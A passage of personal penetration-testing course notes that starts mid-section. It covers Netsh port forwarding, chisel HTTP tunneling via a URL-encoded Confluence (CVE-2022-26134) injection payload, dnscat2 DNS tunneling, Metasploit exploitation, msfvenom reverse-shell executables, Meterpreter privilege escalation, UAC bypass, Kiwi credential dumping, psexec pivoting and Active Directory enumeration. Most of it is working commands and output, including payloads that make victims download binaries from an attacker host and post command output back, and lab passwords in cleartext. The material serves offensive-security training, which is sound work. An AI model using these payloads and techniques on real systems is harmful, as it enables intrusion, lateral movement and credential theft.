    `sudo nmap -sS 192.168.50.64 -Pn -n -p2222`
  - Poking a hole in the Windows Firewall with Netsh  
    `C:\Windows\system32> netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow`
  - SSHing into PGDATABASE01 through the Netsh port forward  
    `kali@kali:~$ ssh database_admin@192.168.50.64 -p2222`
  - Deleting the firewall rule with Netsh  
    `C:\Users\Administrator>netsh advfirewall firewall delete rule name="port_forward_ssh_2222"`
  - Deleting the port forwarding rule with Netsh
    `C:\Windows\Administrator> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64`  

### 20. Tunneling through deep packet inspectation  
- HTTP Tunneling
  - Deep Packet Inspection (DPI) terminating all outbound traffic except HTTP  
  - all inbound ports on CONFLUENCE01 are blocked except TCP/8090  
  - no reverse shell, no port forward/ Only wget or curl
  - no ssh, ncat/socat on victim
  - [chisel](https://github.com/jpillora/chisel/releases), an HTTP tunneling tool that encapsulates our data stream within HTTP. client/server model. check architecture
  - copy chisel binary to Apache2 server folder  
    `sudo cp $(which chisel) /var/www/html/`
  - Starting Apache2 `sudo systemctl start apache2`  
  - download the Chisel binary to /tmp/chisel on CONFLUENCE01 and +x  
    `wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel`
  - execute the wget confluence payload via curl  
    `kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/`
  - view the apache log file > "GET /chisel HTTP/1.1  
    `kali@kali:~$ tail -f /var/log/apache2/access.log`
  - start the chisel server on port 8080  
    `kali@kali:~$ chisel server --port 8080 --reverse`
  - Starting tcpdump to listen on TCP/8080 through the tun0 interface  
    `kali@kali:~$ sudo tcpdump -nvvvXi tun0 tcp port 8080`
  - web shell run chisel client from kali  
    `kali@kali:~$ /tmp/chisel client <kali-ip>:8080 R:socks > /dev/null 2>&1 &`
  - execute the wget confluence payload via curl > ntg happen  
    `curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%27%29.start%28%29%22%29%7D/`
  - read the command output  
    `/tmp/chisel client <kali-ip>:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/`
  - The error-collecting-and-sending injection payload >  check Tcpdump output > " /tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found "  
    `kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20<kali-ip>:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.118.4:8080/%27%29.start%28%29%22%29%7D/`
  - check chisel version in kali > 1.8.1-0kali2 (go1.20.7)  
    `kali@kali:~$ chisel -h`
  - Downloading Chisel 1.8.1 from the main Chisel repo, and copying it to the Apache web root directory  
    `wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz`
  - The Wget payload executed within our cURL Confluence injection command, again.  
    `kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20<kali-ip>/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/`
  - Trying to start the Chisel client using the Confluence injection payload, again  
    `kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20<kali-ip>:8080%20R:socks%27%29.start%28%29%22%29%7D/`
  - Inbound Chisel traffic logged by our tcpdump session  
    `kali@kali:~$ sudo tcpdump -nvvvXi tun0 tcp port 8080`
  - Incoming connection logged by the Chisel server  
    `kali@kali:~$ chisel server --port 8080 --reverse`
  - Using ss to check if our SOCKS port has been opened by the Kali Chisel server >  127.0.0.1:1080  
    `ss -ntplu`
  - installing Ncat (alternative written by the maintainers of Nmap) with apt  
    `sudo apt install ncat`
  - successfull ssh through chisel HTTP tunnel  
    `ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215`
- DNS Tunneling fundamentals
  ```
  Pivot through CONFLUENCE01 (compromise CONFLUENCE01 by exploiting CVE-2022-26134) and ssh to PGDATABASE01
  Reverse shell payload and create an SSH remote port forward to relay a port on our Kali machine to the SSH service on PGDATABASE01
  SSH into PGDATABASE01 as the database_admin user
  SSH to FELINEAUTHORITY (WAN) with username kali and password '7he_C4t_c0ntro11er'
  2 open shells (PGDATABASE01:database_admin, FELINEAUTHORITY:kali)
  ```
  - Dnsmasq is lightweight DNS forwarder and DHCP server. This configuration ignores the /etc/resolv.conf and /etc/hosts
    ```
    kali@felineauthority:~$ cd dns_tunneling
    kali@felineauthority:~/dns_tunneling$ cat dnsmasq.conf

    # Do not read /etc/resolv.conf or /etc/hosts
    no-resolv
    no-hosts

    # Define the zone
    auth-zone=feline.corp
    auth-server=feline.corp
    ```
  - The basic configuration for our Dnsmasq server  
    `kali@felineauthority:~$ cd dns_tunneling`
    `kali@felineauthority:~/dns_tunneling$ cat dnsmasq.conf`  
  - Starting Dnsmasq with the basic configuration  
    `kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq.conf -d`
  - Another shell, Starting tcpdump on FELINEAUTHORITY  
    `kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53`
  - Checking the configured DNS server on PGDATABASE01. >  Current DNS Server: 10.4.50.64 (MULTISERVER03)  
    `database_admin@pgdatabase01:~$ resolvectl status`
  - Using nslookup to make a DNS request for exfiltrated-data.feline.corp > server can't find exfiltrated-data.feline.corp: NXDOMAIN  
    `database_admin@pgdatabase01:~$ nslookup exfiltrated-data.feline.corp`
  - DNS requests for exfiltrated-data.feline.corp coming in to FELINEAUTHORITY from MULTISERVER03  
    `04:57:40.721682 IP 192.168.50.64.65122 > 192.168.118.4.domain: 26234+ [1au] A? exfiltrated-data.feline.corp. (57)`
  - Checking the TXT configuration file then starting Dnsmasq with it.  
    ```
    kali@felineauthority:~/dns_tunneling$ cat dnsmasq_txt.conf
    # TXT record
    txt-record=www.feline.corp,here's something useful!
    txt-record=www.feline.corp,here's something else less useful.

    kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq_txt.conf -d
    ```
  - The TXT record response from www.feline.corp  
    ```
    database_admin@pgdatabase01:~$ nslookup -type=txt www.feline.corp

    Non-authoritative answer:
    www.feline.corp	text = "here's something useful!"
    www.feline.corp	text = "here's something else less useful."
    ```
- DNS tunneling with dnscat2
  - Starting tcpdump to listen for packets on UDP port 53  
    `kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53`
  - Starting the dnscat2 server. > Starting Dnscat2 DNS server on 0.0.0.0:53  
    `kali@felineauthority:~$ dnscat2-server feline.corp`
  - move to PGDATABASE01 to run the dnscat2 client binary (could transfer from kali to PGDATABASE01 via SCP) > session established  
    ```
    database_admin@pgdatabase01:~$ cd dnscat/
    database_admin@pgdatabase01:~/dnscat$ ./dnscat feline.corp
    ```
  - check for connection from dnscat2 client.  
    ```
    kali@felineauthority:~$ dnscat2-server feline.corp
    dnscat2> New window created: 1
    ```
  - use our tcpdump process to monitor the DNS requests to feline.corp v  
    ```
    07:22:19.783146 IP 192.168.118.4.domain > 192.168.50.64.50186: 58205 1/0/0 TXT "2b4c0140b608687c966b10ffff0866c42a" (111)
    07:22:20.438134 IP 192.168.50.64.65235 > 192.168.118.4.domain: 52335+ CNAME? b9740158e00bc5bfbe3eb81e16454173b8.feline.corp. (64)
    ```
  - Interacting with the dnscat2 client from the server  
    ```
    dnscat2> windows
    dnscat2> window -i 1
    command (pgdatabase01) 1> ?
    command (pgdatabase01) 1> listen --help
    ```
  - Setting up a port forward from FELINEAUTHORITY to PGDATABASE01  
    `command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.2.11:445` (listening on 4455 on the loopback interface of FELINEAUTHORITY, and forwarding to 445 on HRSHARES)  
  - another shell Connecting to HRSHARES's SMB server through the dnscat2 port forward  
    `kali@felineauthority:~$ smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234`  

### 21. The metasploit framework  
**Getting familiar with Metasploit**
- **Creating and initializing the Metasploit database**  
  `sudo msfdb init`
- Enable postgresql database service  
  `sudo systemctl enable postgresql`
- Launch Metasploit Framework > msf6 >  
  `sudo msfconsole`
- confirming DB connectivity  
  `msf6 > db_status` `msf6 > help`
- Creating workspace  
  `msf6 > workspace` `msf6 > workspace -a pen200`
- Using db_nmap to scan BRUTE2  
  `msf6 > db_nmap -A 192.168.50.202` `msf6 > hosts` `msf6 > services` `msf6 > services -p 8000`
- help flag for the command 'show'  
  `show -h`
- **List all auxiliary modules**  
  `msf6 > show auxiliary`
- Search all SMB auxiliary modules in Metasploit > 56  auxiliary/scanner/smb/smb_version    
  `msf6 > search type:auxiliary smb`
- Activate smb_version module  
  `use 56`
- info about the smb_version module  
  `msf6 auxiliary(scanner/smb/smb_version) > info` `msf6 auxiliary(scanner/smb/smb_version) > show options`
- set option value  
  `msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.50.202`  
  `msf6 auxiliary(scanner/smb/smb_version) > unset RHOSTS`  
  `msf6 auxiliary(scanner/smb/smb_version) > services -p 445 --rhosts` (Automated fashion)  
- Execute the auxiliary module  
  `msf6 auxiliary(scanner/smb/smb_version) > run`
- Display vulnerabilities identified by Metasploit > SMB Signing Is Not Required  
  `msf6 auxiliary(scanner/smb/smb_version) > vulns`
- Display SSH auxiliary module > 15  auxiliary/scanner/ssh/ssh_login  
  `msf6 auxiliary(scanner/smb/smb_version) > search type:auxiliary ssh` `use 15`
  ```
  msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
  set USERNAME george
  set RHOSTS 192.168.50.201
  set RPORT 2222
  run
  creds
  ```
- **Create a new workspace and search for Apache 2.4.49 modules** >  0  exploit/multi/http/apache_normalize_path_rc  
  `msf6 auxiliary(scanner/ssh/ssh_login) > workspace -a exploits`  
  `msf6 auxiliary(scanner/ssh/ssh_login) > search Apache 2.4.49`  
  `msf6 auxiliary(scanner/ssh/ssh_login) > use 0`
- set payload of the exploit module > Payload options (linux/x64/meterpreter/reverse_tcp)  
  `msf6 exploit(multi/http/apache_normalize_path_rce) > show options`  
  `msf6 exploit(multi/http/apache_normalize_path_rce) > set payload linux/x64/shell_reverse_tcp`
- Metasploit automatically sets up a listener  
- Running the exploit module > Command shell session 2 opened (192.168.119.4:4444 -> 192.168.50.16:35534)   
  ```
  set SSL false
  set RPORT 80
  set RHOSTS 192.168.50.16
  run
  ```
- Backgrounding a session and listing all currently active sessions > 2 shell x64/linux  
  `Background session 2? [y/N]  y`  
  `msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -l`  
- Interact with the previously backgrounded session  
  `msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -i 2`  
  `uname -a`

**Using metasploit payloads**
- **Non-Staged Payloads** (Inline Payloads): These payloads are sent in their entirety along with the exploit. E.g linux/x64/shell_reverse_tcp  
- **Staged Payloads**: These are delivered in two parts. The first stage is a small payload sent initially that causes the target to connect back to the attacker. Then, the second stage—a larger payload containing the main shellcode—is transferred and executed on the target machine. E.g linux/x64/shell/reverse_tcp  
- Show payloads  
  `msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads`
- Use staged TCP reverse shell payload and launch exploit module > 15 payload/linux/x64/shell/reverse_tcp  
  `msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 15` `run`
- **Use Meterpreter non-staged payload/linux/x64/meterpreter_reverse_tcp**  
  ```
  msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 11
  msf6 exploit(multi/http/apache_normalize_path_rce) > run
  meterpreter > sysinfo
  meterpreter > getuid
  meterpreter > shell
  id
  Ctrl+Z
  Background channel 1? [y/N] y 
  ```
- start a second interactive shell, execute command and background the channel  
  ```
  meterpreter > shell
  Process 196 created.
  Channel 2 created.
  whoami
  daemon
  ^Z
  Background channel 2? [y/N]  y
  ```
- List all active channels and interact with channel 1  
  ```
  meterpreter > channel -l
  meterpreter > channel -i 1
  ```
- Use 'download' command in meterpreter  
  ```
  meterpreter > help  
  meterpreter > lpwd  //print local working directory  
  meterpreter > lcd /home/kali/Downloads //change local working directory
  meterpreter > download /etc/passwd //download a file or directory
  meterpreter > lcat /home/kali/Downloads/passwd // Read the contents of a local file to the screen
  meterpreter > upload /usr/bin/unix-privesc-check /tmp/  // Upload a file or directory
  meterpreter > ls /tmp //list files

  meterpreter > exit
  ```        
- **Use non-staged meterpreter payload/linux/x64/meterpreter_reverse_https**  
  ```
  msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 10  
  msf6 exploit(multi/http/apache_normalize_path_rce) > run  
  ```
- **msfvenom** is a standalone command-line tool that is part of the Metasploit Framework used to generate and encode various types of payloads for penetration testing
- Listing a Windows executable with a reverse shell payload  > windows/x64/shell_reverse_tcp  
  `kali@kali:~$ msfvenom -l payloads --platform windows --arch x64`
- Creating a Windows executable with a non-staged TCP reverse shell payload  
  `kali@kali:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe`
- `kali@kali:~$ nc -nvlp 443`  
- Download non-staged payload binary and execute it  
  `PS C:\Users\justin> iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe`  
  `PS C:\Users\justin> .\nonstaged.exe`
  output: C:\Users\justin>
- Creating a Windows executable with a staged TCP reverse shell payload  
  `kali@kali:~$ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o staged.exe`
  repeat the steps above...
  output: whoami //cannot execute any commands because netcat dunno how to handle a staged payload  
- use Metasploit's multi/handler to handle staged, non-staged interactive command prompt  
  ```
  msf6 exploit(multi/http/apache_normalize_path_rce) > use multi/handler
  msf6 exploit(multi/handler) > set payload windows/x64/shell/reverse_tcp
  msf6 exploit(multi/handler) > set LHOST 192.168.119.2
  msf6 exploit(multi/handler) > set LPORT 443
  msf6 exploit(multi/handler) > run

  output: C:\Users\justin> whoami
  
  C:\Users\justin> exit
  msf6 exploit(multi/handler) > run -j
  msf6 exploit(multi/handler) > jobs
  ```

**Post-Exploitation with metasploit**
- Create a Windows executable with a Meterpreter reverse shell payload  
  `kali@kali:~$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.4 LPORT=443 -f exe -o met.exe`
- start multi/handler and set options
  ```
  msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_https
  msf6 exploit(multi/handler) > set LPORT 443
  msf6 exploit(multi/handler) > run
  ```
- Connect to CLIENTWK220 and execute met.exe after downloading it 
  ```
  kali@kali:~$ nc 192.168.50.223 4444
  C:\Users\dave> powershell
  PS C:\Users\dave> iwr -uri http://192.168.119.2/met.exe -Outfile met.exe
  PS C:\Users\dave> .\met.exe

  [*] Meterpreter session 8 opened (192.168.119.4:443 -> 127.0.0.1)
  ``` 
- Display idle time from current user
  `meterpreter > idletime`
- **Display the assigned privileges** to our user in an interactive shell  
  ```
  meterpreter > shell
  C:\Users\luiza> whoami /priv
  ...
  SeImpersonatePrivilege
  ```
- Elevate our privileges with getsystem  
  ```  
  meterpreter > getsystem
  meterpreter > getuid
  ...
  Server username: NT AUTHORITY\SYSTEM
  ```
- Display list of running processe  
  ```
  meterpreter > ps
  ...
  PID    PPID  Name 
  2552   8500  met.exe
  8052   4892  OneDrive.exe
  ```
- **Migrate to explorer.exe**  
  ```
  meterpreter > migrate 8052
  [*] Migrating from 2552 to 8052... 
  ```
- **Migrate to a newly spawned Notepad process**  
  ```
  meterpreter > execute -H -f notepad
  Process 2720 created
  meterpreter > migrate 2720
  ```
- **Reviewing integrity** level  
  ```
  meterpreter > shell
  C:\Windows\system32> powershell -ep bypass
  PS C:\Windows\system32> Import-Module NtObjectManager
  PS C:\Windows\system32> Get-NtTokenIntegrityLevel
  ...
  Medium
  ```
- Background channel and session  
  ```
  PS C:\Windows\system32> ^Z
  meterpreter > bg
  ```
- Search for UAC bypass modules
  ```
  msf6 exploit(multi/handler) > search UAC
  ...
   11  exploit/windows/local/bypassuac_sdclt
  ```
- Executing a **UAC bypass** using a Meterpreter session  
  ```
  msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_sdclt
  msf6 exploit(windows/local/bypassuac_sdclt) > show options
  msf6 exploit(windows/local/bypassuac_sdclt) > set SESSION 9
  msf6 exploit(windows/local/bypassuac_sdclt) > set LHOST 192.168.119.4
  msf6 exploit(windows/local/bypassuac_sdclt) > run
  ...
  PS C:\Windows\system32> Get-NtTokenIntegrityLevel
  Get-NtTokenIntegrityLevel
  High
  ```
- Load the **Kiwi** module and execute creds_msv to retrieve credentials of the system  
  ```
  meterpreter > load kiwi
  meterpreter > help
  ...
  Command                Description
  creds_msv				 Retrieve LM/NTLM creds (parsed)
  ```
  meterpreter > creds_msv
- Pivoting with metasploit
  - Dual interfaces on compromised client > Ethernet0 192.168.50.223 + Ethernet1 172.16.5.199
    `C:\Users\luiza> ipconfig`  
  - Adding route to network 172.16.5.0/24 from session 2
    ```
    msf6 exploit(multi/handler) > route add 172.16.5.0/24 12
    msf6 exploit(multi/handler) > route prin
    ```
  - With a path created to the internal network, we can enumerate this subnet
    ```
    msf6 exploit(multi/handler) > use auxiliary/scanner/portscan/tcp
    msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.5.200 //172.16.5.0/24 
    msf6 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
    msf6 auxiliary(scanner/portscan/tcp) > run
    ...
    [+] 172.16.5.200:         - 172.16.5.200:445 - TCP OPEN
    [+] 172.16.5.200:         - 172.16.5.200:3389 - TCP OPEN
    ```
  - use the psexec module to get access on the second target as user luiza
  - retrieved the NTLM hash via Kiwi and clear password "BoccieDearAeroMeow1!"
  - For psexec to succeed. luiza has to be a local administrator on the second machine
  - used the psexec exploit module to obtain a Meterpreter shell
    ```
    msf6 auxiliary(scanner/portscan/tcp) > use exploit/windows/smb/psexec
    msf6 exploit(windows/smb/psexec) > set SMBUser luiza
    msf6 exploit(windows/smb/psexec) > set SMBPass "BoccieDearAeroMeow1!"
    msf6 exploit(windows/smb/psexec) > set RHOSTS 172.16.5.200
    msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp
    msf6 exploit(windows/smb/psexec) > set LPORT 8000
    msf6 exploit(windows/smb/psexec) > run
    ```
  - alternative, use the autoroute post-exploitation module to set up pivot routes through an existing Meterpreter session
    remove the previous route + terminated the previous meterpreter sessions + route flush  
    ```
    msf6 exploit(windows/smb/psexec) > use multi/manage/autoroute
    msf6 post(multi/manage/autoroute) > show options
    msf6 post(multi/manage/autoroute) > sessions -l
    msf6 post(multi/manage/autoroute) > set session 12
    msf6 post(multi/manage/autoroute) > run
    ```
  - Setting up a SOCKS5 proxy using the autoroute module  
    ```
    msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
    msf6 auxiliary(server/socks_proxy) > show options
    msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
    msf6 auxiliary(server/socks_proxy) > set VERSION 5
    msf6 auxiliary(server/socks_proxy) > run -j
    ```
  - Updated proxychains configuration /etc/proxychains4.conf  
    `tail /etc/proxychains4.conf`
  - Gaining remote desktop access inside the internal network  
    `kali@kali:~$ sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza`  
  - portfwd command
    `meterpreter > portfwd -h`  
    `meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.5.200`  
    `kali@kali:~$ sudo xfreerdp /v:127.0.0.1 /u:luiza`  

**Automating metasploit**  
- activate module  
  ```
  use exploit/multi/handler
  set PAYLOAD windows/meterpreter_reverse_https
  set LHOST 192.168.119.4
  set LPORT 443
  ```
- Set AutoRunScript to the migrate module  
  `set AutoRunScript post/windows/manage/migrate`
- Set ExitOnSession to false to keep the multi/handler listening after a connection  
  `set ExitOnSession false`
- run it as a job in the background and to stop us from automatically interacting with the session  
  `run -z -j`
- Executing the resource script  
  `kali@kali:~$ sudo msfconsole -r listener.rc`
- Executing the Windows executable containing the Meterpreter payload  
  `PS C:\Users\justin> iwr -uri http://192.168.119.4/met.exe -Outfile met.exe`  
  `PS C:\Users\justin> .\met.exe`  
- Incoming connection and successful migration to a newly spawned Notepad process  
  ```
  [*] Spawning notepad.exe process to migrate into
  [*] Migrating into 5340
  [+] Successfully migrated into process 5340
  ```
- Listing all resource scripts provided by Metasploit  
  `kali@kali:~$ ls -l /usr/share/metasploit-framework/scripts/resource`

### 22. Active directory introduction and enumeration  
- Active Directory (AD): The overall directory service for the domain (e.g., corp.com).
- Domain Controller (DC): One or more servers that hold the AD database and manage authentication and replication of information.
- Organizational Units (OUs): Logical containers within the AD domain used to organize users, computers, and groups for easier management and application of policies.
  
**Manual enumeration**
- Legacy window tools
  - Connecting to the Windows 11 client using "xfreerdp"  
    `kali@kali:~$ xfreerdp3 /u:stephanie /d:corp.com /v:192.168.50.75` //password: LegmanTeamBenzoin!!
  - remote choice: RDP then PowerShell or winrm  
  - enumerate users  
    `C:\Users\stephanie>net user /domain`
  - enumerate specific user > domain Admins  
    `C:\Users\stephanie>net user jeffadmin /domain`
  - enumerate groups > Development Department, Management Department, Sales Department  
    `C:\Users\stephanie>net group /domain`
  - enumerate members for specific group > pete, stephanie  
    `PS C:\Tools> net group "Sales Department" /domain`
- PowerShell and .NET classes
  - Remote Server Administration Tools (RSAT) rarely present and needs admin privilege to install.  
  - leverage an Active Directory Services Interface (ADSI) to use LDAP  
  - LDAP path format  
    `LDAP://HostName[:PortNumber][/DistinguishedName]`
  - Use Primary Domain Controller (PDC) > find the DC holding the PdcRoleOwner property  
  - A DN is a name that uniquely identifies an object in AD (E.g: CN=Stephanie,CN=Users,DC=corp,DC=com)  
  - Domain class from System.DirectoryServices.ActiveDirectory namespace > PdcRoleOwner: DC1.corp.com  
    `PS C:\Users\stephanie> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()`  
  - Creating script "enumeration.ps1"- storing domain object in our first variable  
    ```
    # Store the domain object in the $domainObj variable
    $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

    # Print the variable
    $domainObj
    ```
  - To run the script, we must bypass the execution policy to keep us accidentlly running PowerShell scripts
    `PS C:\Users\stephanie> powershell -ep bypass`  
    `PS C:\Users\stephanie> .\enumeration.ps1`  
  - Adding the **$PDC** variable to our script and extracting PdcRoleOwner name to it
    ```
    # Store the domain object in the $domainObj variable
    $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

    # Store the PdcRoleOwner name to the $PDC variable
    $PDC = $domainObj.PdcRoleOwner.Name

    # Print the $PDC variable
    $PDC
    ```
  - Using ADSI to obtain the DN for the domain
    `PS C:\Users\stephanie> ([adsi]'').distinguishedName`
  - Adding the **$DN** variable to our script
    ```
    # Store the domain object in the $domainObj variable
    $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

    # Store the PdcRoleOwner name to the $PDC variable
    $PDC = $domainObj.PdcRoleOwner.Name

    # Store the Distinguished Name variable into the $DN variable
    $DN = ([adsi]'').distinguishedName

    # Print the $DN variable
    $DN
    ```
  - Script which will create the full LDAP path required for enumeration
    ```
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DN = ([adsi]'').distinguishedName 
    $LDAP = "LDAP://$PDC/$DN"
    $LDAP
    ```
  - Run the script to create the full LDAP path
    `PS C:\Users\stephanie> .\enumeration.ps1`  
    LDAP://DC1.corp.com/DC=corp,DC=com
- search functionality in script
  - `PS C:\Users\stephanie> .\enumeration.ps1` to search AD
    ```
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DN = ([adsi]'').distinguishedName 
    $LDAP = "LDAP://$PDC/$DN"

    $direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

    $dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
    $dirsearcher.FindAll()
    ...
    LDAP://DC1.corp.com/DC=corp,DC=com
    LDAP://DC1.corp.com/CN=Users,DC=corp,DC=com
    ```
 - Using **samAccountType** attribute to filter normal user accounts
   ```
   $dirsearcher.filter="samAccountType=805306368"
   ...
   LDAP://DC1.corp.com/CN=Administrator,CN=Users,DC=corp,DC=com {logoncount, codepage, objectcategory, description...}
   LDAP://DC1.corp.com/CN=Guest,CN=Users,DC=corp,DC=com         {logoncount, codepage, objectcategory, description...}
   ```
 - Adding a nested loop which will print each property on its own line
   ```
   $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
   $PDC = $domainObj.PdcRoleOwner.Name
   $DN = ([adsi]'').distinguishedName 
   $LDAP = "LDAP://$PDC/$DN"

   $direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

   $dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
   $dirsearcher.filter="samAccountType=805306368"
   $result = $dirsearcher.FindAll()

   Foreach($obj in $result)
   {
      Foreach($prop in $obj.Properties)
      {
        $prop
      }

      Write-Host "-------------------------------"
   }
   ```
 - Adding the name property to the filter and only print the "memberof" attribute in the nested loop
   ```
   $dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
   $dirsearcher.filter="name=jeffadmin"
   $result = $dirsearcher.FindAll()
	
   Foreach($obj in $result)
   {
	  Foreach($prop in $obj.Properties)
	  {
	     $prop.memberof
	  }
	
	  Write-Host "-------------------------------"
	}
   ```
 - Running script to only show jeffadmin and which groups he is a member of
   ```
   PS C:\Users\stephanie> .\enumeration.ps1
   CN=Domain Admins,CN=Users,DC=corp,DC=com
   CN=Administrators,CN=Builtin,DC=corp,DC=com
   ```
 - A function that accepts user input
   ```
   function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()

   }
   ```
 - Importing our function to memory  
   `Import-Module .\function.ps1`
 - Performing a user search using the new function  
   `PS C:\Users\stephanie> LDAPSearch -LDAPQuery "(samAccountType=805306368)"`  
   `PS C:\Users\stephanie> LDAPSearch -LDAPQuery "(objectclass=group)"`
 - Using "foreach" to iterate through the objects in $group variable
   ```
   PS C:\Users\stephanie\Desktop> foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
	 $group.properties | select {$_.cn}, {$_.member}
   }
   ```
 - Adding the search to our variable called $sales  
   `PS C:\Users\stephanie> $sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"`
 - printing the member attribute on the Sales Department group object  
   ```
   $sales.properties.member
   ...
   CN=Development Department,DC=corp,DC=com
   ```
 - Printing the member attribute on the Development Department group object  
   ```
   PS C:\Users\stephanie> $group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Development Department*))"
   PS C:\Users\stephanie> $group.properties.member
   ...
   CN=Management Department,DC=corp,DC=com
   ```
 - Printing the member attribute on the Management Department group object  
   ```
   PS C:\Users\stephanie\Desktop> $group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Management Department*))"

   PS C:\Users\stephanie\Desktop> $group.properties.member
   ...
   CN=jen,CN=Users,DC=corp,DC=com
   ```
- PowerView
  - Importing PowerView to memory  
    `PS C:\Tools> Import-Module .\PowerView.ps1`  
  - Obtaining domain information  
    `PS C:\Tools> Get-NetDomain`
  - Querying users in the domain  
    `PS C:\Tools> Get-NetUser`
  - Querying users using select statement  
    `PS C:\Tools> Get-NetUser | select cn`
  - querying users displaying pwdlastset and lastlogon  
    `PS C:\Tools> Get-NetUser | select cn,pwdlastset,lastlogon`
  - Querying groups in the domain using PowerView  
    `PS C:\Tools> Get-NetGroup | select cn`
  - Enumerating the "Sales Department" group  
    `PS C:\Tools> Get-NetGroup "Sales Department" | select member`  

**Info gathering**
- Enumerating OS
  - Partial domain computer overview > dnshostname: DC1.corp.com; operatingsystem: Windows Server 2022 Standard  
    `PS C:\Tools> Get-NetComputer`  
    `PS C:\Tools> Get-NetComputer | select operatingsystem,dnshostname`  
- Permissions and Logged on Users  
  - don't necessarily need to immediately escalate to Domain Admins because there may be other accounts that have higher privileges than a regular domain use  
  - Scanning domain to find local administrative privileges for our user  
    `PS C:\Tools> Find-LocalAdminAccess` > client74.corp.com
  - Checking logged on users with Get-NetSession  
